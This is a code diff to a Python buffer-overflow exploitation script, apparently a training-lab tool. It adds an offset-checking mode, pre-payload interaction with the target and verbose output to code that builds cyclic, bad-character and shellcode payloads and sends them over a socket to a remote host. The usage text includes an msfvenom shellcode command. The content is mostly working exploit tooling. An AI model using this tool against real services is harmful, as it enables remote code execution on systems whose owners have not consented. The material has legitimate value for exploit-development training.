@@ -11,7 +11,7 @@ import binascii
 import os
 import getopt
 
-VERBOSE = True
+VERBOSE = False
 
 # Script usage
 def print_usage(scriptName):
@@ -23,6 +23,10 @@ def print_usage(scriptName):
 
 	print("cyclic - Sends cyclic string to help identify memory positions")
 	print(" {} -m cyclic --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/'".format(scriptName))
+	print("")
+
+	print("checkoffset - Auxiliary mode for offset detection on pattern")
+	print(" {} -m checkoffset --value=31704331 --length=5000".format(scriptName))
 	print("")
 
 	print("write - Writes hex value to buffer offset")
@@ -48,6 +52,8 @@ def print_usage(scriptName):
 	print(" --buffsize	: Amount of variable bytes to send.")
 	print(" --buffhead	: Static buffer string set at the beginning of the buffer.")
 	print("		 Is usually the crash string. Size is considered in buffSize calc.")
+	print(" --interact	: Interact with the application before sending the payload. For each message in string (separated with ';;'), sends and receives response from app.")
+	print("		 Example: --interact='login;;user' --> Sends 'login', gets response, sends 'user', gets response, and finally sends the generated payload")
 	print(" --offset	: Place in buffer where content can be added.")
 	print(" --hexcontent	: Hex string to add at the offset position.")
 	print("		Can be considered as big endian (default) or little endian (will be reversed).")
@@ -60,6 +66,8 @@ def print_usage(scriptName):
 	print(" --shellcode	: Hex shell code file generated using msfvenom. Example:")
 	print("		msfvenom -p windows/exec cmd=calc.exe -b '\\x00' -f hex EXITFUNC=thread -o opencalc")
 	print(" --nops		: Amount of nops to add before and after the shell code. Default is 0.")
+	print(" --value		: Offset value.")
+	print(" --length	: Cyclic pattern length.")
 
 
 # Auxiliary functions ###################################################################
@@ -87,6 +95,16 @@ def create_cyclic_pattern(length = 8192):
 	#print("Cyclic pattern:", pattern) if VERBOSE else None
 
 	return pattern
+
+# Verifies pattern offset
+def check_pattern_offset(value, length = 8192):
+	pattern = create_cyclic_pattern(length)
+	hexvalue = binascii.unhexlify(hex_reverse(value)).decode()
+	
+	try:
+		return pattern.index(hexvalue)
+	except ValueError:
+		return 'Not found'
 
 # Checks if hex string value is valid
 def is_valid_hex(content, size):
@@ -128,8 +146,10 @@ def create_bad_chars(start, excludeChars):
 	return binascii.unhexlify(badChars)
 
 # Reverses hex string
-def hex_reverse(values):
+def hex_reverse(value):
+	values = value if isinstance(value, list) else [value]
 	reverseVal = ""
+
 	for val in values:
 		reverseVal = reverseVal + "".join(reversed([val[i:i+2] for i in range(0, len(val), 2)]))
 
@@ -299,15 +319,15 @@ def create_exploit_payload(buffHead, buffSize, offsetCount, binContent, reverseJ
 #########################################################################################
 
 if __name__ == "__main__":
-	DEFAULT_SOCKET_BUFF_SIZE = 1024
+	DEFAULT_SOCKET_BUFF_SIZE = 4096
 	scriptName = sys.argv[0]
 
 	# Avaiable modes
-	AVAILABLE_MODES = ["test", "cyclic", "write", "exploit"]
+	AVAILABLE_MODES = ["test", "cyclic", "write", "exploit", "checkoffset"]
 
 	# Input parameters
 	try:
-		opts, args = getopt.getopt(sys.argv[1:], "hnm:", ["help", "norec", "mode=", "rhost=", "rport=", "buffhead=", "buffsize=", "offset=", "hexcontent=", "badchar=", "exclude=", "reversejmp=", "shellcode=", "nops="])
+		opts, args = getopt.getopt(sys.argv[1:], "hnvm:", ["help", "norec", "verbose", "mode=", "rhost=", "rport=", "buffhead=", "buffsize=", "offset=", "hexcontent=", "badchar=", "exclude=", "reversejmp=", "shellcode=", "nops=", "interact=", "value=", "length="])
 	except getopt.GetoptError as err:
 		print("Error:", err)
 		print_usage(scriptName)
@@ -327,6 +347,9 @@ if __name__ == "__main__":
 	reverseJmpSize = 0
 	shellCodeFile = ""
 	nops = 0
+	interact = []
+	patternValue = ""
+	patternLength = 8192
 
 	# Verify options
 	for opt, value in opts:
@@ -335,6 +358,8 @@ if __name__ == "__main__":
 			sys.exit(1)	
 		elif opt in ("-n", "--norec"):
 			norec = True
+		elif opt in ("-v", "--verbose"):
+			VERBOSE = True
 		elif opt in ("-m", "--mode"):
 			mode = value
 			if mode not in AVAILABLE_MODES:
@@ -363,53 +388,74 @@ if __name__ == "__main__":
 			shellCodeFile = value
 		elif opt == '--nops':
 			nops = int(value)
+		elif opt == '--interact':
+			interact = value.split(";;")
+		elif opt == '--value':
+			patternValue = value
+		elif opt == '--length':
+			patternLength = int(value)
 		else:
 			print("Error: Unknown parameter")
 			print_usage(scriptName)
 			sys.exit(1)
 
+	print("Arguments: mode={} | norec={} | rhost={} | rport={} | buffhead={} | buffsize={} | offset={} | hexcontent={} | badchar={} | exclude={} | reversejmp={} | shellcode={} | nops={} | interact={} | value={} | length={}".format(mode, norec, rhost, rport, buffHead, buffSizeParam, offset, hexContent, badCharOption, badCharExcluded, reverseJmpSize, shellCodeFile, nops, interact, patternValue, patternLength)) if VERBOSE else None
 
-	print("Arguments: mode={} | norec={} | rhost={} | rport={} | buffhead={} | buffsize={} | offset={} | hexcontent={} | badchar={} | exclude={} | reversejmp={} | shellcode={} | nops={}".format(mode, norec, rhost, rport, buffHead, buffSizeParam, offset, hexContent, badCharOption, badCharExcluded, reverseJmpSize, shellCodeFile, nops)) if VERBOSE else None
+	# Tool
+	if not mode:
+		print("Error: script mode must be set.")
+		print_usage(scriptName)
 
-	if not mode or not rhost or not rport or not buffSizeParam:
+	# Checkoffset
+	if mode == "checkoffset" and not patternValue:
+		print("Error: incorrect number of params for --checkoffset.")
+		sys.exit(1);
+	elif mode == "checkoffset":
+		patternOffset = check_pattern_offset(patternValue, patternLength)
+		print("Offset for length {}: {}".format(patternLength, patternOffset))
+		sys.exit(0)
+
+	# Other modes minimum params
+	if not rhost or not rport or not buffSizeParam:
 		print("Error: incorrect minimum number of params.")
 		print_usage(scriptName)
 		sys.exit(1);
 
+	# Calc buff size
 	buffSize = buffSizeParam - len(buffHead)
-
-	# Verify mode and create payload
 	buffPayload = ""
 
-	if mode == 'test':
+	# Verify mode to create payload
+	if mode == "test":
 		buffPayload = create_test_payload(buffHead, buffSize)
 
-	elif mode == 'cyclic':
+	elif mode == "cyclic":
 		buffPayload = create_cyclic_payload(buffHead, buffSize)
 
-	elif mode == 'write':
+	elif mode == "write":
 		if not hexContent:
 			print("Error: incorrect number of params for --mode=write.")
 			sys.exit(1);
 
 		binContent = get_binary_content(hexContent)
 
-		if badCharOption == 'before':
+		if badCharOption == "before":
 			if not reverseJmpSize:
 				print("Error: incorrect number of params for --mode=write, --badchar=before.")
 				sys.exit(1);
 
 			buffPayload = create_badchar_payload_before(buffHead, buffSize, offset, binContent, reverseJmpSize, badCharExcluded)
 
-		elif badCharOption == 'after':
+		elif badCharOption == "after":
 			buffPayload = create_badchar_payload_after(buffHead, buffSize, offset, binContent, badCharExcluded)
 			
 		else:
 			buffPayload = create_write_payload(buffHead, buffSize, offset, binContent)
 
-	elif mode == 'exploit':
-		if not os.path.isfile(shellCodeFile):
+	elif mode == "exploit":
+		if not os.path.exists(shellCodeFile):
 			print("Error: shellcode param is not a valid file")
+			sys.exit(1);
 
 		binContent = get_binary_content(hexContent)
 
@@ -433,6 +479,17 @@ if __name__ == "__main__":
 
 		# Application connection return
 		if not norec:
+			r = s.recv(50000)	
+			print(r) if VERBOSE else None
+
+		# Interact with the application before sending the payload		
+		for tValue in interact:
+			print("") if VERBOSE else None
+			print("App interaction, sending: {}".format(tValue)) if VERBOSE else None
+			interactValue = tValue.encode()			
+			s.send(interactValue)
+
+			# Application payload return
 			r = s.recv(DEFAULT_SOCKET_BUFF_SIZE)
 			print(r) if VERBOSE else None
 
